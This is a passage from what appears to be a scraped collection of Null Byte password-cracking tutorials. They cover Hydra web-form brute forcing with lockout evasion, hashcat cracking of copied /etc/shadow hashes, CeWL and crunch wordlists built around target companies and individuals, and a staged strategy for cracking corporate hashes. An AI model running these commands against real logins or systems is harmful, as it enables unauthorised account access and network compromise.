(0.01%)\nletmein   = 26  (0.01%)\ntorrent   = 24  (0.01%)\nqazwsx    = 24  (0.01%)\nMykey2011 = 23  (0.01%)\n1234      = 21  (0.01%)\n666666    = 20  (0.01%)\nshadow    = 19  (0.01%)\n12345     = 19  (0.01%)\n1234567   = 19  (0.01%)\n1q2w3e4r  = 19  (0.01%)\ndragon    = 18  (0.0%)\nfuckyou   = 18  (0.0%)\nTop 25 Base Words\nThe website-specific \"utorrent\" passwords is at the top of the base words list. It's not uncommon to see people include the website name into their password. There are probably thousands of Null Byte readers using the password \"nullbyte,\" \"wonderhowto,\" or some variation.\nutorrent = 205 (0.06%)\npassword = 166 (0.05%)\nforum    = 164 (0.05%)\nqwerty   = 128 (0.04%)\nmykey    = 62  (0.02%)\ndragon   = 49  (0.01%)\ntorrent  = 42  (0.01%)\nletmein  = 36  (0.01%)\nmelto    = 36  (0.01%)\nshadow   = 35  (0.01%)\nabcd     = 35  (0.01%)\nqazwsx   = 32  (0.01%)\nmonkey   = 31  (0.01%)\ntrustno  = 31  (0.01%)\nfuckyou  = 29  (0.01%)\nsuperman = 28  (0.01%)\npass     = 28  (0.01%)\nalex     = 28  (0.01%)\nlove     = 28  (0.01%)\nmatrix   = 27  (0.01%)\nkiller   = 27  (0.01%)\nmaster   = 25  (0.01%)\npassw0rd = 25  (0.01%)\nnokia    = 24  (0.01%)\nwelcome  = 24  (0.01%)\n* Don't Miss: Crack Online Web Form Passwords with THC-Hydra & Burp Suite\nLet Me Guess ... Your Password Is '123456'\nThe most common passwords between 2012 and 2016 are \"123456,\" \"password,\" and \"123456789\" — with a few variations in how they rank on a site-to-site basis. With that data spanning six years, it's reasonable to believe these are still the most common password used today.\nThe more interesting data was discovered within the base words and digits appended to each password. These two datasets can be combined to create a much more (statistically) effective password-guessing wordlist.\nUntil next time, follow me on Twitter @tokyoneon_ and GitHub. And as always, leave a comment below or message me on Twitter if you have any questions.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image and screenshots by tokyoneon/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Online Web Form Passwords with THC-Hydra & Burp Suite",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/",
        "content": "* field containing the password\n* failure message\nWe can identify each of these using a proxy such as Tamper Data or Burp Suite.\nStep 3: Using Burp Suite\nAlthough we can use any proxy to do the job, including Tamper Data, in this post we will use Burp Suite. You can open Burp Suite by going to Applications -> Kali Linux -> Web Applications -> Web Application Proxies -> burpsuite. When you do, you should see the opening screen like below.\nNext, we will be attempting to crack the password on the Damn Vulnerable Web Application (DVWA). You can run it from the Metasploitable operating system (available at Rapid7) and then connecting to its login page, as I have here.\nWe need to enable the Proxy and Intercept on the Burp Suite like I have below. Make sure to click on the Proxy tab at the top and then Intercept on the second row of tabs. Make certain that the \"Intercept is on.\"\nLast, we need to configure our IceWeasel web browser to use a proxy. We can go to Edit -> Preferences -> Advanced -> Network -> Settings to open the Connection Settings, as seen below. There, configure IceWeasel to use 127.0.0.1 port 8080 as a proxy by typing in 127.0.0.1 in the HTTP Proxy field, 8080 in the Port field and delete any information in the No Proxy for field at the bottom. Also, select the \"Use this proxy server for all protocols\" button.\nStep 4: Get the Bad Login Response\nNow, let's try to log in with my username OTW and password OTW. When I do so, the BurpSuite intercepts the request and shows us the key fields we need for a THC-Hydra web form crack.\nAfter collecting this information, I then forward the request from Burp Suite by hitting the \"Forward\" button to the far left . The DVWA returns a message that the \"Login failed.\" Now, I have all the information I need to configure THC-Hydra to crack this web app!\nGetting the failure message is key to getting THC-Hydra to work on web forms. In this case, it is a text-based message, but it won't always be. At times it may be a cookie, but the critical part is finding out how the application communicates a failed login. In this way, we can tell THC-Hydra to keep trying different passwords; only when that message does not appear, have we succeeded.\nStep 5: Place the Parameters into Your THC Hydra Command\nNow, that we have the parameters, we can place them into the THC-Hydra command. The syntax looks like this:\nkali > hydra -L <username list> -p <password list> <IP Address> <form parameters><failed login message>\nSo, based on the information we have gathered from Burp Suite, our command should look something like this:\nkali >hydra -L <wordlist> -P<password list>192.168.1.101 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\"\nA few things to note. First, you use the upper case \"L\" if you are using a username list and a lower case \"l\" if you are trying to crack one username that you supply there. In this case, I will be using the lower case \"l \" as I will only be trying to crack the \"admin\" password.\nAfter the address of the login form (/dvwa/login.php), the next field is the name of the field that takes the username. In our case, it is \"username,\" but on some forms it might be something different, such as \"login.\"\nNow, let's put together a command that will crack this web form login.\nStep 6: Choose a Wordlist\nNow, we need to chose a wordlist. As with any dictionary attack, the wordlist is key. You can use a custom one made with Crunch of CeWL, but Kali has numerous wordlists built right in. To see them all, simply type:\nkali > locate wordlist\nIn addition, there are numerous online sites with wordlists that can be up to 100 GB! Choose wisely, my hacker novitiates. In this case, I will be using a built-in wordlist with less than 1,000 words at:\n/usr/share/dirb/wordlists/short.txt\nStep 7: Build the Command\nNow, let's build our command with all of these elements, as seen below.\nkali > hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\" -V\n* -l indicates a single username (use -L for a username list)\n* -P indicates use the following password list\n* http-post-form indicates the type of form\n* /dvwa/login-php is the login page URL\n* username is the form field where the username is entered\n* ^USER^ tells Hydra to use the username or list in the field\n* password is the form field where the password is entered (it may be passwd, pass, etc.)\n* ^PASS^ tells Hydra to use the password list supplied\n* Login indicates to Hydra the login failed message\n* Login failed is the login failure message that the form returned\n* -V is for verbose output showing every attempt\nStep 8: Let Her Fly!\nNow, let her fly! Since we used the -V switch, THC-Hydra will show us every attempt.\nAfter a few minutes, Hydra returns with the password for our web application. Success!\nFinal Thoughts\nAlthough THC-Hydra is an effective and excellent tool for online password cracking, when using it in web forms, it takes a bit of practice. The key to successfully using it in web forms is determining how the form responds differently to a failed login versus a successful login. In the example above, we identified the failed login message, but we could have identified the successful message and used that instead. To use the successful message, we would replace the failed login message with \"S=successful message\" such as this:\nkali > hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&S=success message\" -V\nAlso, some web servers will notice many rapid failed attempts at logging in and lock you out. In this case, you will want to use the wait function in THC-Hydra. This will add a wait between attempts so as not to trigger the lockout. You can use this functionality with the -w switch, so we revise our command to wait 10 seconds between attempts by writing it:\nkali > hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\" -w 10 -V\nI recommend that you practice the use of THC-Hydra on forms where you know the username and password before using it out \"in the wild.\"\nKeep coming back, my hacker novitiates, as we continue to expand your repertoire of hacker techniques and arts!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image via Shutterstock",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Passwords, Part 5 (Creating a Custom Wordlist with CeWL)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/",
        "content": "* WonderHowTo\nWelcome back, my novice hackers!\nIn my series on cracking passwords, I began by showing off some basic password-cracking principles; developed an efficient password-cracking strategy; demonstrated how to use Hashcat, one of the most powerful password-cracking programs; and showed how to create a custom wordlist using Crunch. In this tutorial, I will show you how to create a custom wordlist based upon the industry or business of the targets using CeWL.\nMost password-cracking programs are only as good as the wordlist that you provide them. Brute-force password cracking is very tedious and time consuming, but if you can find an appropriate and well-designed wordlist that is specific to the user whose password you are trying to crack, you can save yourself hours—maybe even days—of password cracking.\nCrunch is great at creating wordlists based upon a set of rules such as the number of characters, the character set, etc., but doesn't enable us to choose a wordlist that is particular to a business or industry or interests. We humans are not always very creative and often fall victim to the familiar, especially when generating passwords. If we understand that, it can be helpful to finding potential passwords and generating a relevant password list.\nFor instance, employees at a construction company are more likely to use words for passwords that are used in their industry, such as lumber, girder, build, soffit, eave, etc. People in the drug industry are more likely have passwords such as prescription, drug, narcotic, barbiturate, etc. You get the idea.\nIt's simply human nature that words that we use in our everyday experience will first pop into our heads when we are considering passwords. That's why so many people use their pet's name, spouse's names, children's names, birthdates, street address, anniversaries, etc. They aren't very creative and use words and numbers that first come to mind.\nWe can use this lack of creativity to develop a specific wordlist for a specific company or industry. That's what CeWL can do for us. It's designed to grab words from the company's website to create a wordlist specific to the company in order to crack passwords of the users at that business.\nLet's get started.\nStep 1: Fire Up Kali & CeWL Help\nFirst, fire up Kali and open a terminal. Next, let's type the \"cewl\" command and get its help screen.\n* kali > cewl --help\nNote the depth (-d) and the min_word_length (-m) switches. The -d switch determines how deep (the default is 2) into the website CeWL will crawl grabbing words, and the -m switch determines the minimum length of words it will grab. Since most firms have a minimum password length, there's no need to grab short words. In this case, I will be setting the minimum to 7 letters.\nStep 2: Build a Custom List with CeWL\nNow, to build a custom wordlist, we set CeWL to scraping words from the website of our friends at SANS Institute. We can do this by typing:\n* kali > cewl -w customwordlist.txt -d 5 -m 7 www.sans.org\nLet's break that down.\n* -w customwordlist.ext: the -w means write to the file name that follows.\n* -d 5: the depth (in this case, 5) that CeWL will crawl to website.\n* -m 7: the minimum word length; in this case it will grab words of 7 characters minimum.\n* www.sans.org: the website we are crawling.\nThis command will then crawl the sans.org website to a depth of 5 pages, grabbing words at least 7 letters long. After several hours of crawling through the website, CeWL places all of the words it found into the file customwordlist.txt. We can then open it with any text editor; in this case, we will use Leafpad.\n* kali > leafpad customwordlist.txt\nThis will open the file like that below.\nNote that these words are a reflection of the industry that SANS Institute is in—information security.\nStep 3: Combine This List with a List Generated by Crunch\nNow, combine this wordlist with another wordlist, or one generated by Crunch. Place these words first as they are specific to this user or company and are more likely to be correct.\nOf course, we can use CeWL to create custom wordlists for password cracking targets other than employees at a particular company. For instance, if we know the individual who is our target is a soccer fan, we use CeWL to crawl a soccer site to grab soccer related words. That is, we can use CeWL to create specific password lists based upon just about any subject area by simply crawling a website to grab potential keywords.\nStay tuned: we will continue to explore new and better ways to crack passwords in this series, so keep coming back, my novice hackers!\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image via Shutterstock",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Passwords, Part 4 (Creating a Custom Wordlist with Crunch)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/",
        "content": "* WonderHowTo\nWelcome back, my apprentice hackers!\nIn this series on password cracking, I have been attempting to develop your skills in the age-old art of password cracking. Although it might seem like a simple and straightforward exercise, those of you who have attempted password cracking know that there are many subtleties to this art.\nIn many of our password cracking disciplines, we often need to use a wordlist that will essentially attempt thousands of potential passwords per second. This is often referred to as a dictionary attack, even though we need not rely solely on dictionary words. These wordlists may have any combination of characters and words in an attempt to crack a complex password offline.\nSometimes we may have indications of the target's choice password or password components which may come from our knowledge of the target, e.g. girlfriend, neighbor, friend, etc. It could be their name, children's names, a pet's name, birthday, or job. We may also know the organization's password policy (e.g. minimum 8 characters, uppercase and lowercase, etc.).\nIn these cases, we may be able to generate a custom wordlist that reflects our knowledge of the target or the organization's password policy.\nKali Linux has built into it a tool called \"crunch\" that enables us to create a custom password-cracking wordlist that we can use with such tools like Hashcat, Cain and Abel, John the Ripper, Aircrack-ng, and others. This custom wordlist might be able to save us hours or days in password cracking if we can craft it properly.\nLet's get started with crunch and generate some custom wordlists to crack passwords in our favorite password cracking tool.\nStep 1: Fire Up Kali & Open Crunch\nLet's start by firing up Kali and opening crunch by going to Applications -> Kali Linux -> Password Attacks -> Offline Attacks -> crunch.\nThis will open the crunch screen like that below.\nUnlike many other hacking applications, crunch doesn't provide us with much info in its opening screen. I believe that's because crunch, although relatively simple to work with initially, has so many sophisticated options that the developer has put much of the information in man pages.\nStep 2: The Crunch Syntax\nThe basic syntax for crunch looks like this:\nkali > crunch <min> max<max> <characterset> -t <pattern> -o <output filename>\nNow, let's go over what's included in the syntax above.\n* min = The minimum password length.\n* max = The maximum password length.\n* characterset = The character set to be used in generating the passwords.\n* -t <pattern> = The specified pattern of the generated passwords. For instance, if you knew that the target's birthday was 0728 (July 28th) and you suspected they used their birthday in their password (people often do), you could generate a password list that ended with 0728 by giving crunch the pattern @@@@@@@0728. This word generate passwords up to 11 characters (7 variable and 4 fixed) long that all ended with 0728.\n* -o <outputfile> = This is the file you want your wordlist written to.\nStep 3: The Crunch Manual\nLet's go to the man pages for crunch by typing:\nkali > man crunch\nThis should open the manual pages for crunch like that below. The developers of crunch have packed these pages with a lot of info on how to get the most out of crunch.\nIf we page down a bit in these man pages, we will come to this page (notice at the bottom, it says we are at line 70).\nAt the top we see the -f switch. This switch allows us to choose the character set we want to use to generate our wordlist. The syntax is:\n-f /path/to/charset.lst <charactersetname>\nHere we tell crunch where the charset.lst is with the full path and then select a particular character set from that list. In Kali, the charset.lst is at:\n/usr/share/rainbowcrack/charset.lst\nStep 4: Create Some Simple Wordlists\nLet's start by generating some simple wordlists for password cracking. Let's assume that we know the company has passwords between 4 and 8 characters. We can generate all the possibilities in crunch by typing:\nkali > crunch 4 8\nWhere the first number (4) is the shortest word length and the second (8) is the longest word length.\nWhen we execute this statement, crunch estimates how large the file will be (1812 GB) and then begins to generate the list.\nWhat if we knew that the target always used number passwords between 6 and 8 characters? We could generate a complete list of password possibilities meeting this criteria and send them to a file in the root user's directory called numericwordlist.lst by typing:\nkali > crunch 6 8 1234567890 -o /root/numericwordlist.lst\nIf we knew that the target's birthday was July 28 and they likely used that date (people often use their birthdates in their passwords to make it easier to remember) at the end of a ten character password? We could generate all the possibilities of ten-character passwords that end with 0728 and send the output to a file in the root user's directory named birthdaywordlist.lst, by typing:\nkali > crunch 10 10 -t @@@@@@0728 -o /root/birthdaywordlist.lst\nThe @ sign is use to represent a wildcard of all possibilities, while the literals \"0728\" represent the fixed values.\nStep 5: Complex Wordlists with Crunch\nOne of the beauties of crunch is the ability to select a specific character set or create your own character set for generating your password list. If we know the likely character set the target is using for their password, we can select the character set to generate our password list. We can find the choice of character sets at:\n/usr/share/rainbowcrack/charset.txt\nNow, if we know that our target is using an eight character password with only alphabetic characters, we can generate a list of all the possibilities in crunch with the command:\nkali > crunch 8 8 -f /usr/share/rainbowcrack/charset.txt mixalpha -o /root/alphawordlist.lst\nThis will generate all the 8-character passwords using only the alphabetic characters (no numbers or special characters) and storing them in a file called alphawordlist.lst in the root user's directory.\nWhen cracking passwords, there are multiple methods of cracking unknown passwords. These include dictionary, rainbow table, brute force and others. If we know that parameters of the password or know something about the target and their possible passwords (birthday, pet names, spouse, etc.), crunch can be a very useful tool for generating specific wordlists to be used in a dictionary-like attack.\nThat's it for this lesson; stay tuned to this series on password cracking for more guides in the near future.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image via Shutterstock",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Passwords, Part 3 (Using Hashcat)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/",
        "content": "* WonderHowTo\nWelcome back, my greenhorn hackers!\nContinuing with my series on how to crack passwords, I now want to introduce you to one of the newest and best designed password crackers out there—hashcat. The beauty of hashcat is in its design, which focuses on speed and versatility. It enables us to crack multiple types of hashes, in multiple ways, very fast.\nAs mentioned in the first part of this series, passwords are stored in a one-way encryption called hashes. There are multiple ways of obtaining these hashes, such as .dll injection in Windows systems or capturing the hash in transit, such as in WPA2 wireless cracking.\nOnce we can grab the hash, the next step becomes one of finding an effective and efficient way of cracking it. There are numerous tools, some of which I have highlighted in other articles here, but hashcat is unique in its design and versatility, so let's take a look at how it works.\nStep 1: Fire Up Kali & Open Hashcat\nLet's start by firing up Kali and opening hashcat. Go to Applications -> Kali Linux -> Password Attacks -> Offline Attacks -> hashcat, as seen below.\nWhen we click on the hashcat menu item, it opens the help screen.\nAt the top of the screen, you can see the basic hashcat syntax:\nkali > hashcat options hashfile mask|wordfiles|directories\nWe can see some of the options for hashcat displayed below the basic syntax. Some of the most important of these are -m (the hashtype) and -a (attack mode). In general, we will need to use both of these options in most password cracking attempts with hashcat.\nStep 2: More Extensive Options\nIf we scan a bit further down this hashcat help screen, we can see more options. The first two below are some of the key options that hashcat enables.\nFirst, hashcat enables rules that allow us to apply specifically designed rules to use on our wordlist file. These rules can take our wordlist file and apply capitalization rules, special characters, word combinations, appended and prepended numbers, and so on. Each of these will help us to break passwords that have been made more complex to avoid dictionary attacks.\nThe next stanza shows us custom character sets. This enables us to set the character set that we want to use to crack the passwords. If we know the company's or institution's password policy, we can choose a subset of all characters to meet their policy and speed up our cracking. For instance, if a company allows an all-numeric character set, choose to crack the hashes with just numbers. These types of passwords are VERY easy to crack.\nThe next screen includes some of the more obscure options, including the output file type, the debug mode and the built-in character sets.\nFinally, we have to chose the type of hash we are trying to crack. Hashcat gives us numerous options. When we get ready to crack the hash, we need to designate in our command what type of hash we are working with by giving hashcat the number associated with the hash type. Here we can see a list of some of the hash types hashcat can work with.\nStep 3: Choose Your Wordlist\nIn this tutorial, we will be using a simple dictionary attack on some Linux hashes. To do so, we need a wordlist to work from. There are literally thousands of wordlists available on the web, but Kali has numerous wordlists built right in, so let's try using one of those.\nTo find the built in wordlists in Kali, we can type:\nkali > locate wordlist\nWhen we do, we can see that there are dozens of wordlists available.\nI will be using the wordlist built for sqlmap, which has over one million words and hybrid words.\nStep 4: Grab the Hashes\nIn the next step, we need to grab the hashes on our Kali system. If we are logged in as root, we can see and grab the hashes. In Linux, the hashes are stored in the /etc/shadow file, so if we type:\nkali > tail /etc/shadow\nWe can see the shadow file with the hashes, as below.\nNext, we need to know what type of hashing the system is using. In Linux, we go to the /etc/login.defs to view what encryption type the system is using. We open that file by typing:\nkali > more /etc/login.defs\nWhen we navigate about 85% down the file, we can see that Kali is using SHA512 encryption. This is important, as we will need to tell hashcat this information when we are ready to crack the hashes.\nStep 5: Crack the Hashes!\nNow, that we know the basics of hashcat, where the hashes are located and the type of encryption, we are ready to begin cracking the hashes.\nLet's first put those hashes into a separate file we will name hash.lst.\nkali > cp /etc/shadow hash.lst\nTo make sure that they were copied over, let's check by typing:\nmore hash.lst\nAs we can see, the hashes have been copied over to the hash.lst file.\nTo prepare this file for cracking, we need to remove all of the information in this file, except the hashes. The /etc/shadow file includes the username, then the salted hash, and then information about the applicable user policy. We need to remove all that information leaving just the hash.\nWe can see that this file starts with the username, i.e., \"user1\", \"user2\", etc. Open this file in your favorite text editor (vim, vi, leafpad) and delete the username and the following colon. Then, go to the end of the line and remove the information after the hash that starts with a colon (:). Now we will have a file with just the hashes and nothing else.\nIn the final step, we can now start cracking the hashes. Here's the command I used.\nkali > hashcat -m 1800 -a 0 -o cracked.txt --remove hash.lst /usr/share/sqlmap/txt/wordlist.txt\n* -m 1800 designates the type of hash we are cracking (SHA-512)\n* -a 0 designates a dictionary attack\n* -o cracked.txt is the output file for the cracked passwords\n* --remove tells hashcat to remove the hash after it has been cracked\n* hash.lst is our input file of hashes\n* /usr/share/sqlmap/txt/wordlist.txt is the absolute path to our wordlist for this dictionary attack\nOnce the cracking process starts, we can hit <enter> to get an update on the process. When hashcat has completed its work, you will see a screen like below where hashcat announces that it has recovered all my hashes after 9 :47:16 of work.\nNow, we only need to open the cracked.txt file to view our cracked passwords!\nHashcat may be the world's best password cracking tool right now, so take some time to get to know it. It has many more features that we have not yet touched on, and a version that uses your GPU (oclhashcat) that can crack passwords many times faster than your CPU can!\nCover image via Shutterstock (1, 2)",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Passwords, Part 2 (Cracking Strategy)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-2-cracking-strategy-0156491/",
        "content": "* WonderHowTo\nWelcome back, my hacker apprentices!\nLast week, I started off my password cracking series with an introduction on the principles and technologies involved in the art of cracking passwords. In past guides, I showed some specific tools and techniques for cracking Windows, online, Wi-Fi, Linux, and even SNMP passwords. This series is intended to help you hone your skills in each of these areas and expand into some, as yet, untouched areas.\nVery often, hackers new to password cracking are looking for a single tool or technique to crack passwords, but unfortunately, that does not exist. That's fortunate for network security, though. Each type of password requires a unique strategy tailored to the situation. The situation can be the type of encryption (MD5, SHA1, NTLM, etc.), remote vs. offline, salted or unsalted, an so on. Your password cracking strategy must be specific to the situation.\nIn this tutorial, I want to discuss password cracking strategy. Many newbie password crackers simply run their password cracking tool and expect a breakthrough. They run huge wordlists and hope for the best. If it doesn't crack the password, they are lost. Here I want to develop a multi-iteration strategy for password cracking that will work on the vast majority of passwords, though not all. No strategy will work on all passwords with the exception of the CPU and time-intensive brute force cracking.\nDeveloping a Password-Cracking Strategy\nI'm assuming here that we are after more than a single password. Generally, password cracking is an exercise of first capturing the hashes. In Windows systems, these are in the SAM file on local systems, LDAP in active directory systems, and /etc/shadow on Linux and UNIX systems. These hashes are one-way encryption that are unique for every password input (well, nearly every password input, to be precisely accurate). In each case, we need to know what encryption scheme is being used in order to crack the hash.\nFor instance, Linux and Unix systems use MD5 and modern Windows systems use HMAC-MD5. Other systems may use SHA1, MD4, NTLM, etc. Make certain you know what hash is being used on the system you are trying to crack, otherwise you will spend hours or days without satisfactory results.\nAll that having been said, John the Ripper has an automatic hash detector that is correct about 90% of the time, but when it is wrong, there is no way to know. In Cain and Abel as well as hashcat, we must tell the tool what type of hash we are trying to crack.\nHere we can see a screenshot of the types of hashes that we can crack using hashcat and their numeric values.\nStep 1: Brute Force Short Passwords\nAlthough it might seem contrary to common sense, I often start by trying to brute force very short passwords. Although brute force of long passwords can be very time consuming (days or weeks), very short passwords can be brute forced in a matter of minutes.\nI start by trying to brute force passwords of six characters or less. Depending upon my hardware, this can usually be accomplished in a matter of minutes or hours. In many environments, this will yield at least a few passwords.\nIn addition, I will also try to brute force all numeric passwords at this stage. Number passwords are the easiest to crack. An 8-character numeric password only requires that we try 100 million possibilities, and even a 12-character number password only requires 1 trillion possibilities. With powerful hardware, we can do this with barely breaking a sweat.\nHere we have configured Cain and Abel to brute force 6-character passwords that are only numbers.\nStep 2: Low-Hanging Fruit\nOnce we broken a few short passwords by brute force, we will still likely have a file that has many, many hashes in it. If we trying to compromise an institutional or corporate network, we usually only need to crack a single password to begin the network compromise.\nAlthough the user whose password is cracked may have limited rights and privileges, there are many ways to escalate privileges to sysadmin or root. This means that if we can crack a single password on a network, we can likely take down the entire network.\nAll of the above having been said, let's next go after any low-hanging fruit. That means let's go next after those passwords that are easiest to crack. For instance, if we now the institution has a password policy that all passwords must be 8 characters, many people will make their passwords the absolute minimum.\nTo attempt a quick and dirty pass on these hashes, simply chose a list of dictionary words that are eight characters. Running through the millions of words in such a list will generally only take only a few hours and is likely to yield a significant portion of the passwords.\nStep 3: Try Common Passwords\nHuman beings, although we think we unique, tend to think and act similarly. Just like pack animals, we follow the herd and act similarly. The same can be said for passwords.\nUsers want a password that fulfills their organizations minimum password policy, but also is easy to remember. That's why you will see passwords, such as \"P@ssw0rD\" so often. Despite its obvious simplicity, it fulfills a password policy of minimum of 8 characters, uppercase and lowercase letters, a special character, and a number. Believe it or not, this password and its variations are used numerous times.\nKnowing that humans tend to use these types of passwords, in my next iteration on the password hash list, I will try a password list of commonly found passwords. Numerous sites on the web include wordlists of cracked or captured passwords. In addition, you might try scraping the web to capture as many passwords as possible.\nStep 4: Combine Words with Numbers\nRunning through the low-hanging fruit in Step #2 and common passwords on Step #3 will likely yield at least a few passwords and the time it consumes is minimal. Now we want to attack the remaining hashes and take the next step in complexity.\nIn this iteration, we will run the remaining hashes through a wordlist that has longer dictionary words and dictionary words with numbers. Users, because they are forced to change passwords periodically, will often just add numbers to the beginning or end of their passwords. Some of our password cracking tools like hashcat and John the Ripper allow us to use rules to apply to wordlist to combine words, append and prepend numbers, change case, etc.\nStep 5: Hybrid Attack\nBy now we have usually cracked over 50% of the passwords in Steps #1 through #4, but we have the harder work ahead to crack the more intransigent passwords. These passwords will often include special characters and combined words.\nThese would include such passwords as \"socc3rmom\" and \"n3xtb1gth1ng\". These are relatively strong passwords including special characters and numbers, but because they include variations on dictionary words they are often easily crackable.\nNext, we need a password list that combines dictionary words with numbers and special characters. Fortunately, this is something that John the Ripper does automatically, but other password crackers (Cain and Abel) don't necessarily. Hashcat can be run with one of its many rule sets to combine words and special characters to your wordlist.\nIn this screenshot, we can see the combinator rule in hashcat that adds upper case characters to combined words.\nStep 6: Finally, if All Else Fails...\nIf all else fails, you are left to brute force the passwords. This can very slow with a single CPU, but can speeded up 1000x or more with a botnet, a password cracking ASIC, or a very fast multiple GPU password cracker (I'll be doing tutorials on each of these in the near future). Among the fastest of these, a 25 GPU password cracker is capable of 348 billion hashes per second!\nEven when we are left with a brute force attack, we can be strategic about it. For instance, if we know that the password policy is a minimum of 8 characters, try brute forcing with just eight characters. It will save you time and likely yield some passwords.\nIn addition, you can choose your character set. Once again, if we know that the password policy is uppercase, lowercase, and a number, choose only those character sets to brute force.\nFinally, some password crackers like hashcat (look for my upcoming tutorial on hashcat) have built-in \"policies\" that you can choose to attempt the brute force. These are similar to strategies and help by shaping your attacks based on the password-construction protocol followed by a company or group.\nThese rules can be used in other password cracking tools such John the Ripper. Here we can see a listing of these rules in hashcat (these can be used in John the Ripper, as well).\nIt is important to be successful at password cracking that you follow a systematic strategy, no matter what tool you are using, that requires multiple iterations to crack the most passwords. This strategy generally works from the passwords that are easiest to crack to the most difficult.\nOf course, this strategy will in part be dependent upon the tools you are using, the wordlists that you use, and the password policy of the victim. Although, I have laid out here my password cracking strategy, yours may be different and need to be adapted to the environment your are working in.\nCover image via Shutterstock (1, 2)",
        "category": "Password Cracking"
    },
    {
        "title": "How to Crack Passwords, Part 1 (Principles & Technologies)",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-1-principles-technologies-0156136/",
        "content": "* WonderHowTo\nWelcome back, my neophyte hackers!\nI have already done a few tutorials on password cracking, including ones for Linux and Windows, WEP and WPA2, and even online passwords using THC Hydra. Now, I thought it might be worthwhile to begin a series on password cracking in general. Password cracking is both an art and a science, and I hope to show you the many ways and subtleties involved.\nWe will start with the basic principles of password cracking that are essential to ALL password cracking techniques, followed by some of the tools and technologies used. Then, one by one, I will show you how to use those principles and technologies effectively to crack or capture the various types of passwords out there.\nThe Importance & Methods of Password Cracking\nPasswords are the most widely used form of authentication throughout the world. A username and password are used on computer systems, bank accounts, ATMs, and more. The ability to crack passwords is an essential skill to both the hacker and the forensic investigator, the latter needing to hack passwords for accessing the suspect's system, hard drive, email account, etc.\nAlthough some passwords are very easy to crack, some are very difficult. In those cases, the hacker or forensic investigator can either employ greater computing resources (a botnet, supercomputer, GPU, ASIC, etc.), or they can look to obtain the password in other ways.\nThese ways might include insecure storage. In addition, sometimes you don't need a password to access password-protected resources. For instance, if you can replay a cookie, session ID, a Kerberos ticket, an authenticated session, or other resource that authenticates the user after the password authentication process, you can access the password protected resource without ever knowing the password.\nSometimes these attacks can be much easier than cracking a complex and long password. I will do a tutorial on various replay attacks in the near future (look out specifically for my upcoming article on stealing the Facebook cookie to access someone's Facebook account).\nNow, let's start with the basics.\nStep 1: Password Storage\nIn general, passwords are not stored in clear text. As a rule, passwords are stored as hashes. Hashes are one-way encryption that are unique for a given input. These systems very often use MD5 or SHA1 to hash the passwords.\nIn the Windows operating system, passwords on the local system are stored in the SAM file, while Linux stores them in the /etc/shadow file. These files are accessible only by someone with root/sysadmin privileges. In both cases, you can use a service or file that has root/sysadmin privileges to grab the password file (e.g. DLL injection with samdump.dll in Windows).\nStep 2: Types of Attacks\nA dictionary attack is the simplest and fastest password cracking attack. To put it simply, it just runs through a dictionary of words trying each one of them to see if they work. Although such an approach would seem impractical to do manually, computers can do this very fast and run through millions of words in a few hours. This should usually be your first approach to attacking any password, and in some cases, it can prove successful in mere minutes.\nRainbow Table\nMost modern systems now store passwords in a hash. This means that even if you can get to the area or file that stores the password, what you get is an encrypted password. One approach to cracking this encryption is to take dictionary file and hash each word and compare it to the hashed password. This is very time- and CPU-intensive. A faster approach is to take a table with all the words in the dictionary already hashed and compare the hash from the password file to your list of hashes. If there is a match, you now know the password.\nBrute Force\nBrute force is the most time consuming approach to password cracking. It should always be your last resort. Brute force password cracking attempts all possibilities of all the letters, number, special characters that might be combined for a password and attempts them. As you might expect, the more computing horsepower you have, the more successful you will be with this approach.\nA hybrid password attack is one that uses a combination of dictionary words with special characters, numbers, etc. Often these hybrid attacks use a combination of dictionary words with numbers appending and prepending them, and replacing letters with numbers and special characters. For instance, a dictionary attack would look for the word \"password\", but a hybrid attack might look for \"p@$$w0rd123\".\nStep 3: Commonly Used Passwords\nAs much as we think each of us is unique, we do show some common patterns of behavior within our species. One of those patterns is the words we choose for passwords. There are number of wordlists that have been compiled of common passwords. In recent years, many systems have been cracked and passwords captured from millions of users. By using these already captured passwords, you are likely to find at least a few on the network you are trying to hack.\nStep 4: Password Cracking Strategy\nMany newbies, when they start cracking passwords, simply choose a tool and word list and then turn them loose. They are often disappointed with the results. Expert password crackers have a strategy. They don't expect to be able to crack every password, but with a well-developed strategy, they can crack most passwords in a very short amount of time.\nThe key to develop a successful strategy of password cracking is to use multiple iterations, going after the easiest passwords with the first iteration to the most difficult passwords using different techniques for each 